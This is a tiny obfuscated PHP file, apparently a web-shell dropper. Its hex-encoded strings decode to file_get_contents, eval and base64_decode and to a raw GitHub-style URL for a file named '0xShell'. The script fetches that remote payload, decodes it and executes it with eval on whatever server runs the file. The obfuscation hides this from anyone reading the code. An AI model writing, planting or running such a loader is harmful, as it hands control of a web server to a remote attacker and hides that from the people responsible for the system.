<?php
$fn1 = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$fn2 = "\x65\x76\x61\x6c";
$v1 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x73\x2e\x63\x6f\x6d\x2f\x74\x65\x6d\x65\x6d\x70\x69\x6b\x31\x33\x33\x37\x2f\x30\x78\x53\x68\x65\x6c\x6c\x2f\x6d\x61\x69\x6e\x2f\x30\x78\x65\x6e\x63\x62\x61\x73\x65\x2e\x6a\x73";
$v2 = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";

$x = $fn1($v1);
$fn2($v2($x));
?>
